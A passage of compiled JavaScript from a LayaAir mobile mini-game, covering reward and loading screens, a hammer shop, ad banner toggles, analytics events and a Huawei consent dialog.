                    this.eggBar.value = num - resume;
                }
                else {
                    this.eggBar.value = 0;
                }
            }
        }
        onShown() {
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                Game.MultiPlatforms.hideCustom1();
                Game.PlatAdUtil.hideBannerAd();
            }
            this.overGames += 1;
            this.isopen = false;
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                if (this.overGames >= Game.gameBanner && Game.nameList == 1 && Game.gameSwitch == 1 && Game.GameCfg.plat == Game.PlatType.wx) {
                    this.nowGames += 1;
                    if (this.nowGames >= Game.game_bannerinterval) {
                        this.nowGames = 0;
                        this.isopen = true;
                        let num = 1;
                        if (Game.game_box > 2) {
                            let str = String(Game.game_box);
                            num = Number(str.charAt(this.gameBoxIndex));
                            this.gameBoxIndex += 1;
                            if (this.gameBoxIndex >= str.length) {
                                this.gameBoxIndex = 0;
                            }
                        }
                        else {
                            num = Game.game_box;
                        }
                        if (num == 1) {
                            console.log("banner");
                            this.isloadbanner = true;
                            if (!Game.PlatAdUtil.banner) {
                                this.loadBannerFail();
                            }
                            this.loadFirstUI1();
                        }
                        else if (num == 2) {
                            console.log("custom");
                            this.isloadbanner = false;
                            if (!Game.gamescustom) {
                                this.loadCustomFail();
                            }
                            this.loadFirstUI2();
                        }
                    }
                }
                else {
                    this.isopen = false;
                }
            }
            else if (Game.GameCfg.plat == Game.PlatType.mz) {
                if (Game.gameSwitch == 1) {
                    Game.PlatAdUtil.hideBannerAd();
                    this.isopen = true;
                }
                Laya.timer.frameOnce(1, this, () => {
                    let realheight = this.viewComponent._children[0]._rawHeight;
                    if (Game.gameSwitch == 1) {
                        this.eggBtn.y = realheight - this.eggBtn.height;
                        this.loadFirstUI1();
                        this.isopen = true;
                    }
                });
            }
            this.isbanner = false;
            this.eggBar.value = 0;
            if (ConfigMgr.Match_Num == 0) {
                this.getController("c1").selectedIndex = 0;
                this.getController("c4").selectedIndex = 2;
            }
            else {
                this.getController("c1").selectedIndex = 1;
                this.rank1Label.text = (ConfigMgr.Match_Num + 1).toString();
                this.rank2Label.text = (ConfigMgr.Match_Num + 1).toString();
                this.getController("c4").selectedIndex = 1;
            }
            this.getReward();
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_win);
            this.coinLabel.text = "" + Game.overCoin;
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "BoxWindow",
                window_path: "fairy",
            });
            if (this.isopen) {
                if (Game.nameList == 0 && Game.platMgr.plat.platType != Game.PlatType.mz) {
                    this.autoNext();
                }
                else {
                    this.getController("c5").selectedIndex = 1;
                    this.getTransition("t0").play();
                }
            }
            else {
                Game.PlatAdUtil.showBannerAd();
                this.autoNext();
            }
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
        }
        autoNext() {
            this.getController("c5").selectedIndex = 0;
            this.getTransition("t0").play(Laya.Handler.create(this, () => {
                Laya.timer.once(1000, this, () => {
                    this.getTransition("t1").play(Laya.Handler.create(this, () => {
                        Laya.timer.once(1000, this, () => {
                            Game.ViewManager.showSuccess();
                            this.hide();
                        });
                    }));
                });
            }));
        }
        onHide() {
            this.getController("c2").selectedIndex = 0;
        }
        getReward() {
            Game.overMaterial = [];
            if (Game.ViewManager.rewardData.item == 0 && Game.Datas.first != 0) {
                this.rewardList.getController("c1").selectedIndex = 0;
                let item = this.rewardList.getChildAt(0).asCom;
                item.getChild("icon").asLoader.url = "ui://peq2rr6tl9b86d";
                this.getController("c4").selectedIndex = 0;
            }
            else {
                let num = Game.ViewManager.rewardData.item;
                if (num > 3) {
                    num = 3;
                }
                let firstArr = ["it08", "it05"];
                if (Game.Datas.first == 0) {
                    num = 2;
                }
                this.rewardList.getController("c1").selectedIndex = num - 1;
                for (let i = 0; i < num; i++) {
                    let rand = this.randomMaterial();
                    if (Game.Datas.first == 0) {
                        rand = this.getfirstWard(firstArr[i]);
                    }
                    let item = this.rewardList.getChildAt(i).asCom;
                    let skinStr = Item[rand].icon;
                    let res = "ui://icon/" + skinStr;
                    Game.overMaterial.push(res);
                    item.getChild("icon").asLoader.url = res;
                    Game.Datas.getMaterial[rand] += 1;
                    Game.Datas.newMaterial[rand] = 1;
                }
                if (Game.Datas.first == 0) {
                    Game.Datas.first = 1;
                    ConfigMgr.firstGame = 1;
                }
                Game.Datas.setData();
            }
        }
        randomMaterial() {
            let rand = Math.random();
            let randIndex = 0;
            for (let j = 0; j < 10; j++) {
                if (rand < this.rateArr[j]) {
                    randIndex = j;
                    break;
                }
            }
            return randIndex;
        }
        getfirstWard(str) {
            let randIndex = 0;
            for (let i = 0; i < Item.length; i++) {
                if (Item[i].id == str) {
                    randIndex = i;
                    break;
                }
            }
            return randIndex;
        }
        loadBannerFail() {
            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                custom_event_id: "BoxWindow",
                custom_event_name: "banner_loadFail",
                custom_scene_id: String(Game.MultiPlatforms.scene),
                custom_scene_name: "",
                custom_data: [],
                custom_string: "",
                custom_value: 0
            });
        }
        loadCustomFail() {
            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                custom_event_id: "BoxWindow",
                custom_event_name: "custom_loadFail",
                custom_scene_id: String(Game.MultiPlatforms.scene),
                custom_scene_name: "",
                custom_data: [],
                custom_string: "",
                custom_value: 0
            });
        }
        loadFirstUI1() {
            if (this.new1 == 0) {
                this.new1 = 1;
                Laya.LocalStorage.setItem("new1", String(1));
                k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                    custom_event_id: "BoxWindow",
                    custom_event_name: "box1_Join_people",
                    custom_scene_id: String(Game.MultiPlatforms.scene),
                    custom_scene_name: "",
                    custom_data: [],
                    custom_string: "",
                    custom_value: 0
                });
            }
            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                custom_event_id: "BoxWindow",
                custom_event_name: "box1_Join_num",
                custom_scene_id: String(Game.MultiPlatforms.scene),
                custom_scene_name: "",
                custom_data: [],
                custom_string: "",
                custom_value: 0
            });
        }
        loadFirstUI2() {
            if (this.new2 == 0) {
                this.new2 = 1;
                Laya.LocalStorage.setItem("new2", String(1));
                k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                    custom_event_id: "BoxWindow",
                    custom_event_name: "box2_Join_people",
                    custom_scene_id: String(Game.MultiPlatforms.scene),
                    custom_scene_name: "",
                    custom_data: [],
                    custom_string: "",
                    custom_value: 0
                });
            }
            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                custom_event_id: "BoxWindow",
                custom_event_name: "box2_Join_num",
                custom_scene_id: String(Game.MultiPlatforms.scene),
                custom_scene_name: "",
                custom_data: [],
                custom_string: "",
                custom_value: 0
            });
        }
        rewardFirtUI1() {
            if (this.getrewardnew1 == 0) {
                this.getrewardnew1 = 1;
                Laya.LocalStorage.setItem("getrewardnew1", String(1));
                k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                    custom_event_id: "BoxWindow",
                    custom_event_name: "box1_getReward_People",
                    custom_scene_id: String(Game.MultiPlatforms.scene),
                    custom_scene_name: "",
                    custom_data: [],
                    custom_string: "",
                    custom_value: 0
                });
            }
            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                custom_event_id: "BoxWindow",
                custom_event_name: "box1_getReward_num",
                custom_scene_id: String(Game.MultiPlatforms.scene),
                custom_scene_name: "",
                custom_data: [],
                custom_string: "",
                custom_value: 0
            });
        }
        rewardFirtUI2() {
            if (this.getrewardnew2 == 0) {
                this.getrewardnew2 = 1;
                Laya.LocalStorage.setItem("getrewardnew2", String(1));
                k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                    custom_event_id: "BoxWindow",
                    custom_event_name: "box2_getReward_People",
                    custom_scene_id: String(Game.MultiPlatforms.scene),
                    custom_scene_name: "",
                    custom_data: [],
                    custom_string: "",
                    custom_value: 0
                });
            }
            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                custom_event_id: "BoxWindow",
                custom_event_name: "box2_getReward_num",
                custom_scene_id: String(Game.MultiPlatforms.scene),
                custom_scene_name: "",
                custom_data: [],
                custom_string: "",
                custom_value: 0
            });
        }
    }
    Game.BoxWindow = BoxWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class GameLoadScene extends k7.AppScene {
        constructor() {
            super("loading", "Load");
            if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
                this.isFullScreen = ConfigMgr.fixedWidth == 1;
                this.isCenter = true;
            }
        }
        onEvent() {
        }
        bindChild() {
            this.scenePos = this.getComp("n5");
        }
        onClickButton(btn) {
            switch (btn) {
            }
        }
        refreshUi() {
        }
        onShown() {
            Laya.timer.frameOnce(1, this, () => {
                let num = this.scenePos._parent._height - 1280;
                let localY = num / 350;
                let addSize = 2 - num / 560;
                Game.GameManager.instance.SceneManager.Load_Player(localY, addSize, this.scenePos.displayObject, () => {
                    this.getTransition("out").play();
                });
                this.getTransition("in").play();
            });
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "GameLoadScene",
                window_path: "fairy",
            });
        }
        onHide() {
        }
    }
    Game.GameLoadScene = GameLoadScene;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class GameScene extends k7.AppScene {
        constructor() {
            super("Main", "Game");
            this.coolingTime = 10000;
            this.comboNum = 0;
            this.points = [];
            this.loadIndex = 0;
            this.callback = null;
            this.first_click = 0;
            this.ishaveSkin = false;
            this._eventList = [
                GameEvt.surplusRefresh,
                GameEvt.comboRefresh,
                GameEvt.matchRefresh,
                GameEvt.closematch,
                GameEvt.killRefresh,
                GameEvt.createPoint,
                GameEvt.refreshPoint,
                GameEvt.pointClear,
                GameEvt.openFirst,
                GameEvt.bigTips
            ];
            if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
                this.isFullScreen = ConfigMgr.fixedWidth == 1;
                this.isCenter = true;
            }
        }
        onEvent(evt, data) {
            switch (evt) {
                case GameEvt.surplusRefresh:
                    this.surplusLabel.text = "" + data + " Left";
                    break;
                case GameEvt.comboRefresh:
                    this.initCombo();
                    break;
                case GameEvt.matchRefresh:
                    this.loadIndex += 1;
                    if (this.getController("c3").selectedIndex == 0) {
                        this.getController("c3").selectedIndex = 1;
                    }
                    this.getLoader("n22.n" + String(28 + this.loadIndex - 1) + ".icon").url = data.head;
                    if (data.isover == true) {
                        this.getController("c3").selectedIndex = 0;
                        this.getController("c5").selectedIndex = 1;
                    }
                    break;
                case GameEvt.closematch:
                    this.getController("c4").selectedIndex = 1;
                    Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_timing);
                    Laya.timer.once(1000, this, () => {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_timing);
                        Laya.timer.once(1000, this, () => {
                            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_timing);
                        });
                    });
                    this.getComp("n13").getTransition("t0").play(Laya.Handler.create(this, () => {
                        if (data.callback) {
                            data.callback();
                        }
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_start);
                        this.getController("c4").selectedIndex = 0;
                        if (this.ishaveSkin && Game.Datas.first == 1) {
                            k7.AppWindow.show(Game.TryWindow);
                        }
                    }));
                    break;
                case GameEvt.killRefresh:
                    //this.createKillMatch(data.selfname, data.selfhead, data.killname, data.killhead);
                    break;
                case GameEvt.createPoint:
                    this.createEnemyPoint();
                    break;
                case GameEvt.refreshPoint:
                    this.points[data.index].visible = data.visible;
                    this.points[data.index].x = data.pos.x;
                    let localY = data.pos.y;
                    if (localY <= 100) {
                        localY = 100;
                    }
                    else if (localY >= 1180) {
                        localY = 1180;
                    }
                    if (this.points[data.index]) {
                        this.points[data.index].y = localY;
                        this.points[data.index].rotation = data.rot;
                    }
                    break;
                case GameEvt.pointClear:
                    this.clearPoint();
                    break;
                case GameEvt.openFirst:
                    this.getController("c6").selectedIndex = 1;
                    this.callback = data.callback;
                    if (this.first_click == 0) {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_guide_1);
                    }
                    break;
                case GameEvt.bigTips:
                    this.createbigTip(data.tip, data.head);
                    break;
            }
        }
        bindChild() {
            this.surplusLabel = this.getLabel("n2");
            this.sevendownCom = this.getComp("n3");
            this.sevenupCom = this.getComp("n5");
            this.start_tip = this.getComp("n24");
            this.skin_btn = this.getButton("n16");
            this.skinLoader = this.getLoader("n16.icon");
            this.hammerParent = Game.GameManager.instance.SceneManager.findChild("Bip001/Bip001 Pelvis/Bip001 Spine/Bip001 Neck/Bip001 R Clavicle/Bip001 R UpperArm/Bip001 R Forearm/Bip001 R Hand/wuqi", Game.GameManager.instance.SceneManager.player);
            this.viewComponent._children[0].on(Laya.Event.MOUSE_DOWN, this, () => {
                if (this.getController("c6").selectedIndex == 1) {
                    this.getController("c6").selectedIndex = 0;
                    Game.PlatAdUtil.hideBannerAd();
                    if (this.first_click == 0) {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_guide_2);
                        this.first_click = 1;
                        Laya.LocalStorage.setItem("first_click", "1");
                    }
                    if (this.callback) {
                        this.callback();
                    }
                }
            });
            if (!Laya.LocalStorage.getItem("first_click")) {
                this.first_click = 0;
            }
            else {
                this.first_click = Number(Laya.LocalStorage.getItem("first_click"));
            }
        }
        onClickButton(btn) {
            switch (btn) {
                case this.skin_btn:
                    if (Game.GameManager.instance.PlayerMove.playerLv >= Grow.length) {
                        Game.MultiPlatforms.showToast("Level Max");
                    }
                    else {
                        Game.rpMgr.getReward(Game.RewardPointId.changeScale, () => {
                            Game.GameManager.instance.PlayerMove.changeBig();
                        }, null);
                    }
                    break;
            }
        }
        refreshUi() {
            mvc.send(GameEvt.GAME_START);
        }
        onShown() {
            this.getController("c5").selectedIndex = 0;
            this.loadIndex = 0;
            for (let i = 0; i < 9; i++) {
                this.getLoader("n22.n" + String(28 + i) + ".icon").url = "";
            }
            this.getLoader("n22.n27.icon").url = "ui://icon/" + Skin[Game.nowSkinIndex].icon;
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "GameScene",
                window_path: "fairy",
            });
            this.getRandTry();
            Game.GameManager.instance.PlayerMove.selfhead = "ui://icon/" + Skin[Game.nowSkinIndex].icon;
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                Game.MultiPlatforms.createCustom1("game");
            }
            else if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                if (Game.gameSwitch == 1) {
                    Laya.timer.once(1000, this, () => {
                        Game.PlatAdUtil.showInterAd();
                    });
                }
            }
        }
        onHide() {
        }
        initCombo() {
            Laya.timer.clear(this, this.clearCombo);
            this.comboNum += 1;
            if (this.comboNum == 1) {
                Game.SoundManager.playSound("vo_k" + String(this.comboNum));
            }
            if (this.comboNum < 2)
                return;
            if ((this.comboNum - 1) <= 7) {
                this.getController("c1").selectedIndex = 1;
                this.sevendownCom.getController("c1").selectedIndex = this.comboNum - 2;
                this.sevendownCom.getTransition("t0").play();
                Laya.timer.once(750, this, () => {
                    this.getController("c1").selectedIndex = 0;
                });
            }
            else {
                this.getController("c2").selectedIndex = 1;
                (this.sevenupCom.getChild("title").asLabel).text = "x" + String(this.comboNum - 1);
                this.sevenupCom.getTransition("t0").play();
                Laya.timer.once(750, this, () => {
                    this.getController("c2").selectedIndex = 0;
                });
            }
            if (this.comboNum <= 10) {
                Game.SoundManager.playSound("vo_k" + String(this.comboNum));
            }
            else {
                Game.SoundManager.playSound("vo_k10");
            }
            Laya.timer.once(Game.comboTime * 1000, this, this.clearCombo);
        }
        clearCombo() {
            this.comboNum = 0;
        }
        createKillMatch(selfname, selfhead, killname, killhead) {
            let killmatch = fgui.UIPackage.createObject("Game", "tip_kill").asCom;
            this.viewComponent._children[0].asCom.addChild(killmatch);
            killmatch.setXY(360, 275);
            killmatch.getChild("name").asLabel.text = selfname;
            killmatch.getChild("icon").asLoader.url = selfhead;
            killmatch.getChild("name2").asLabel.text = killname;
            killmatch.getChild("icon2").asLoader.url = killhead;
            Laya.Tween.to(killmatch, { scaleX: 0.8, scaleY: 0.8 }, 150, null, Laya.Handler.create(this, () => {
                Laya.Tween.to(killmatch, { scaleX: 1.1, scaleY: 1.1 }, 200, null, Laya.Handler.create(this, () => {
                    Laya.Tween.to(killmatch, { scaleX: 1, scaleY: 1 }, 150, null, Laya.Handler.create(this, () => {
                        Laya.Tween.to(killmatch, { y: 110, alpha: 0 }, 1500, null, Laya.Handler.create(this, () => {
                            killmatch.dispose();
                            if (killmatch) {
                                this.getController("c3").selectedIndex = 0;
                            }
                        }));
                    }));
                }));
            }));
        }
        createbigTip(tips, head) {
            let tip = fgui.UIPackage.createObject("Game", "tip_ad").asCom;
            this.viewComponent._children[0].asCom.addChild(tip);
            tip.setXY(12, 429);
            tip.getChild("n28").asLabel.text = tips;
            tip.getChild("icon").asLoader.url = head;
            tip.getTransition("t0").play(Laya.Handler.create(this, () => {
                tip.dispose();
            }));
        }
        createEnemyPoint() {
            let pointCom = fgui.UIPackage.createObject("Game", "enemyPoint").asCom;
            let rand = Math.floor(Math.random() * 6);
            pointCom.getController("c1").selectedIndex = rand;
            pointCom.visible = false;
            this.points.push(pointCom);
            this.viewComponent._children[0].asCom.addChild(pointCom);
        }
        clearPoint() {
            for (let i = 0; i < this.points.length; i++) {
                this.points[i].dispose();
            }
            this.points = [];
        }
        getRandTry() {
            this.ishaveSkin = true;
            let skins = {
                name: "",
                index: 0
            };
            if (Game.nowSkinIndex != 0) {
                skins.name = "hammer";
                skins.index = this.randHammer();
                if (skins.index == null) {
                    this.ishaveSkin = false;
                    return;
                }
                else {
                    this.skin_btn.visible = true;
                    this.skinLoader.url = "ui://icon/" + Hammer[skins.index].icon;
                }
            }
            else {
                skins.name = "people";
                skins.index = this.randSkin();
                this.skinLoader.url = "ui://icon/" + Skin[skins.index].icon;
            }
            ConfigMgr.game_SkinData = skins;
        }
        randHammer() {
            let nohaveArr = [];
            for (let i = 0; i < Game.Datas.hammerDatas.length; i++) {
                if (Game.Datas.hammerDatas[i] == 0) {
                    let modelName = Hammer[i].model;
                    if (this.hammerParent.getChildByName(modelName)) {
                        nohaveArr.push(i);
                    }
                }
            }
            if (nohaveArr.length == 0) {
                return null;
            }
            else {
                return nohaveArr[Math.floor(Math.random() * nohaveArr.length)];
            }
        }
        randSkin() {
            return Math.floor(Math.random() * (Skin.length - 1)) + 1;
        }
    }
    Game.GameScene = GameScene;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class HomeHummer extends k7.FairyChild {
        constructor(view) {
            super(view);
            this.selectHammer = -1;
            this._eventList = [
                GameEvt.HomeHummerRefresh,
            ];
        }
        bindChild() {
            this.hammerList = this.getList("n40");
            mvc.on(GameEvt.HomeHummerRefresh, this, () => {
                this.selectHammer = -1;
                this.hammerList.numItems = 13;
                for (let i = 0; i < Game.Datas.hammerDatas.length; i++) {
                    if (Game.Datas.hammerDatas[i] == 2) {
                        if (i >= 8) {
                            this.hammerList.scrollPane.percX = 1;
                        }
                        else {
                            this.hammerList.scrollPane.percX = 0;
                        }
                        break;
                    }
                }
            });
        }
        onListRenderer(items, index) {
            let icon = items.getLoader("icon");
            icon.url = "ui://icon/" + Hammer[index].icon;
            if (this.selectHammer == index) {
                items.getController("c3").selectedIndex = 1;
            }
            else {
                items.getController("c3").selectedIndex = 0;
            }
            if (Game.Datas.hammerDatas[index] == 2) {
                items.getController("c2").selectedIndex = 0;
                items.getController("c1").selectedIndex = 1;
            }
            else if (Game.Datas.hammerDatas[index] == 1) {
                items.getController("c2").selectedIndex = 0;
                items.getController("c1").selectedIndex = 0;
            }
            else {
                items.getController("c1").selectedIndex = 0;
                if (Hammer[index].get == 1) {
                    items.getController("c2").selectedIndex = 3;
                    items.getLabel("n34.title").text = Hammer[index].gold.toString();
                    items.getButton("n34", () => {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
                        if (Game.fast.ecoProxy.checkCoin(Hammer[index].gold)) {
                            Game.fast.ecoProxy.addCoin(-1 * Hammer[index].gold);
                            Game.Datas.setHammerSkin(index);
                            Game.Datas.setData();
                            this.hammerList.numItems = 13;
                        }
                    });
                }
                else if (Hammer[index].get == 2) {
                    items.getController("c2").selectedIndex = 2;
                    items.getLabel("n34.title").text = Game.Datas.videohammerDatas[index] + "/" + Hammer[index].adNum;
                    items.getButton("n34", () => {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
                        Game.rpMgr.getReward(Game.RewardPointId.hammerShop, () => {
                            Game.Datas.videohammerDatas[index] += 1;
                            if (Game.Datas.videohammerDatas[index] >= Hammer[index].adNum) {
                                Game.Datas.setHammerSkin(index);
                            }
                            else {
                                Game.fast.ecoProxy.addCoin(50);
                                Game.MultiPlatforms.showToast("Get Coins 50");
                            }
                            Game.Datas.setData();
                            this.hammerList.numItems = 13;
                        }, null);
                    });
                }
                else if (Hammer[index].get == 3) {
                    items.getController("c2").selectedIndex = 4;
                    items.getLabel("n36").text = "Check";
                }
                else if (Hammer[index].get == 4) {
                    items.getController("c2").selectedIndex = 4;
                    items.getLabel("n36").text = "lv" + Hammer[index].arenaLevel;
                }
            }
        }
        onClickItem(item) {
            if (Game.Datas.hammerDatas[this.hammerList.selectedIndex] == 1) {
                Game.Datas.setHammerSkin(this.hammerList.selectedIndex);
                this.selectRefresh(this.hammerList.selectedIndex);
                this.selectHammer = -1;
            }
            else if (Game.Datas.hammerDatas[this.hammerList.selectedIndex] == 0) {
                if (this.selectHammer != this.hammerList.selectedIndex) {
                    this.selectHammer = this.hammerList.selectedIndex;
                    this.selectRefresh(this.selectHammer);
                }
            }
            else {
                this.selectHammer = -1;
                this.selectRefresh(this.hammerList.selectedIndex);
            }
            this.hammerList.numItems = 13;
        }
        selectRefresh(selectIndex) {
            console.log(Hammer[selectIndex].model);
            let model = Game.GameManager.instance.SceneManager.setHammerSkin(Hammer[selectIndex].model, Game.GameManager.instance.SceneManager.player);
            if (model) {
                model.active = true;
            }
            else {
                Game.GameManager.instance.SceneManager.setHammerSkin(Hammer[0].model, Game.GameManager.instance.SceneManager.player).active = true;
            }
        }
    }
    Game.HomeHummer = HomeHummer;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class HuaWeiWindow extends k7.AppWindow {
        constructor() {
            super("HuaWeiWindow", "huawei");
        }
        bindChild() {
            this.btnNo = this.getButton('btnNo');
            this.btnOk = this.getButton('btnOk');
        }
        onClickButton(btn) {
            switch (btn) {
                case this.btnNo:
                    window['qg'].exitApplication({
                        success: function () {
                            console.log("exitApplication success");
                        },
                        fail: function () {
                            console.log("exitApplication fail");
                        },
                        complete: function () {
                            console.log("exitApplication complete");
                        }
                    });
                    break;
                case this.btnOk:
                    let request = JSON.parse(Laya.LocalStorage.getItem('requestConsent') || "{}");
                    request.state = 1;
                    Laya.LocalStorage.setItem('requestConsent', JSON.stringify(request));
                    if (this.openData && this.openData.callBack) {
                        this.openData.callBack();
                    }
                    this.hide();
                    break;
                default:
                    break;
            }
        }
        onShown() {
        }
        onHide() {
        }
    }
    Game.HuaWeiWindow = HuaWeiWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class LoadScene extends k7.AppScene {
        constructor() {
            super("loading2", "Load");
            if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
                this.isFullScreen = ConfigMgr.fixedWidth == 1;
                this.isCenter = true;
            }
        }
        bindChild() {
            this.pro1 = this.getProgressBar('n3');
            this.pro2 = this.getProgressBar('n4');
            this.pro1Txt = this.getLabel('n3.n3');
            this.pro1.value = 0;
            this.pro2.value = 0;
            this.pro1Txt.text = "0%";
            this.loadPro();
            Laya.timer.loop(1, this, this.loadPro);
            if (Game.platMgr.plat.platType != Game.PlatType.huawei) {
                Game.PlatAdUtil.showBannerAd(false, false);
            }
            new Game.SceneManager().createScene();
            if (Laya.Browser.window.qq) {
                Game.PlatAdUtil.createInterstitialAd();
            }
        }
        loadPro() {
            if (this.pro1.value >= 100 && this.pro2.value >= 100 && ConfigMgr.Load_3D_Over == 1 && ConfigMgr.Load_FAST_Over == 1) {
                Laya.timer.clear(this, this.loadPro);
                if (Game.platMgr.plat.platType == Game.PlatType.huawei) {
                    Laya.timer.once(3000, this, () => {
                        let request = JSON.parse(Laya.LocalStorage.getItem('requestConsent') || "{}");
                        if (!request.state) {
                            k7.AppWindow.showByParam(Game.HuaWeiWindow, {
                                callBack: () => {
                                    if (Game.Datas.first == 0) {
                                        Game.GameManager.instance.GameStart.firstStart();
                                    }
                                    else {
                                        Game.fast.showHomeScene();
                                    }
                                }
                            });
                        }
                        else {
                            if (Game.Datas.first == 0) {
                                Game.GameManager.instance.GameStart.firstStart();
                            }
                            else {
                                Game.fast.showHomeScene();
                            }
                        }
                    });
                }
                else {
                    if (Game.Datas.first == 0) {
                        console.log("首次进入完成");
                        Game.GameManager.instance.GameStart.firstStart();
                    }
                    else {
                        console.log("进入完成");
                        Game.fast.showHomeScene();
                    }
                }
                return;
            }
            if (ConfigMgr.Load_3D_Over != 1 || ConfigMgr.Load_FAST_Over != 1) {
                if (this.pro1.value < 100) {
                    this.pro1.value += 0.5;
                }
                else {
                    this.pro1.value = 100;
                }
                this.pro1Txt.text = Math.floor(this.pro1.value) + "%";
                if (this.pro2.value >= 100) {
                    this.pro2.value = 0;
                }
                this.pro2.value += 2;
            }
            else {
                if (this.pro1.value < 100) {
                    this.pro1.value += 4;
                }
                else {
                    this.pro1.value = 100;
                }
                this.pro1Txt.text = Math.floor(this.pro1.value) + "%";
                if (this.pro2.value >= 100) {
                    this.pro2.value = 0;
                }
                this.pro2.value += 8;
            }
        }
        refreshUi() {
        }
        onShown() {
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "LoadScene",
                window_path: "loading",
            });
        }
        onHide() {
        }
    }
    Game.LoadScene = LoadScene;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MyFailWindow extends passer.plugin.fast.GameFailWindow {
        constructor() {
            super();
        }
        bindChild() {
            super.bindChild();
            this.home_bt = this.getButton("home");
            mvc.on(Game.fast.MsgKey.ON_GAME_RESTART, this, () => {
                Game.GameManager.instance.GameStart.GameInit();
                k7.AppScene.show(Game.GameScene);
                Game.GameManager.instance.GameStart.game_Start();
            });
        }
        onClickButton(btn) {
            super.onClickButton(btn);
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "failWindow",
            });
            switch (btn) {
                case this.home_bt:
                    Game.GameManager.instance.GameStart.GameInit();
                    Game.SoundManager.playBGM(Game.SoundManager.soundName.Audio_bgm_main, true);
                    break;
            }
        }
        refreshUi() {
            super.refreshUi();
            Game.rpMgr.setUIController(Game.RewardPointId.ResultDouble, this.rewardButton.getController("c1"));
        }
        onShown() {
            super.onShown();
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "FailWindow",
                window_path: "fast",
            });
            Game.PlatAdUtil.showBannerAd();
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
            if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                if (Game.gameSwitch == 1) {
                    Laya.timer.once(1000, this, () => {
                        Game.PlatAdUtil.showInterAd();
                    });
                }
            }
        }
        onHide() {
            super.onHide();
        }
        onClickRewardButton() {
            Game.rpMgr.getReward(Game.RewardPointId.ResultDouble, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
        }
        onReward() {
            super.onReward();
        }
    }
    Game.MyFailWindow = MyFailWindow;
    passer.plugin.fast.GameFailWindow = MyFailWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MyGainWindow extends passer.plugin.fast.GainWindow {
        constructor() {
            super();
        }
        onClickButton(btn) {
            super.onClickButton(btn);
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "GainWindow",
            });
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
        }
        onClickRewardButton() {
            Game.rpMgr.getReward(Game.RewardPointId.RigisterDouble, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
        }
        refreshUi() {
            super.refreshUi();
            Game.rpMgr.setUIController(Game.RewardPointId.RigisterDouble, this.rewardButton.getController("c1"));
        }
        onShown() {
            super.onShown();
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "GainWindow",
                window_path: "fast",
            });
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
        }
    }
    Game.MyGainWindow = MyGainWindow;
    passer.plugin.fast.GainWindow = MyGainWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MyHomeScene extends passer.plugin.fast.HomeScene {
        constructor() {
            super();
            this.isstart = false;
            this.firstCompose = null;
            this.secondCompose = null;
            this.secondFloor = new Laya.Vector2(0, 0);
            this.firstName = "";
            this.secondName = [];
            this.modelName = [];
            this.firstIndex = 0;
            this.isfirstClick = false;
            this.iscompose = false;
            this.mappos = [];
            this.selectIndex = 0;
            this.composeCoin1 = 0;
            this.composeCoin2 = 0;
            this.lastSelect = 0;
            this.isbianshen = false;
            this.handTween = new Laya.Tween();
            this.isfirst = false;
            this.isjiao = false;
            this.sortArr = [];
